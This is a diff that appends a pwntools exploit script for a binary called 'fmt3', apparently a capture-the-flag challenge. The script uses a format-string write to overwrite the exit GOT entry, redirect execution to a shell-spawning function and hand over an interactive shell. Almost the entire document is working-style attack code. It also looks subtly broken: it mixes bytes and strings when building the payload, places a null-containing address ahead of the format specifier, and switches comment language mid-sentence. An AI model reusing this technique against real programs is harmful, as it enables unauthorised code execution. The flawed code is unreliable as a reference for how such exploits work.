@@ -156,3 +156,54 @@
  '\n'
  '**Run this script after ensuring that you have the `fmt3` binary in your '
  "current directory and that it's executable.**")
+
+from pwn import *
+
+# Set the context for debugging
+context.log_level = 'debug'
+context.update(arch='amd64', os='linux')
+
+# Load the binary
+elf = ELF('./fmt3')
+
+# Start the process
+p = process('./fmt3')
+
+# Addresses needed
+exit_got = elf.got['exit']
+sub_4008A6 = elf.symbols['sub_4008A6']
+
+# Calculate the lower two bytes to write
+value_to_write = sub_4008A6 & 0xffff  # Get lower 2 bytes of sub_4008A6
+
+# Number of bytes already written (the address takes up 8 bytes)
+num_written = 8
+
+# Calculate padding needed for the format string
+padding = (value_to_write - num_written) % 0x10000
+
+# Build the payload
+# The payload consists of:
+#   - The address we想写入的地方 (exit@got)
+#   - 格式化字符串，用于将所需的值写入该地址
+payload = p64(exit_got)
+payload += '%' + str(padding) + 'c%6$hn'
+
+# Send the username with the payload
+p.recvuntil('Input your username(max lenth:20): ')
+p.sendline(payload)
+
+# Send a dummy password
+p.recvuntil('Input your password(max lenth:20): ')
+p.sendline('password')
+
+# Navigate the menu to trigger the format string vulnerability
+p.recvuntil('Your choice:')
+p.sendline('1')  # This option prints out the username (our payload), triggering the exploit
+
+# Send the option to exit, which will now jump to sub_4008A6
+p.recvuntil('Your choice:')
+p.sendline('3')
+
+# Interact with the spawned shell
+p.interactive()
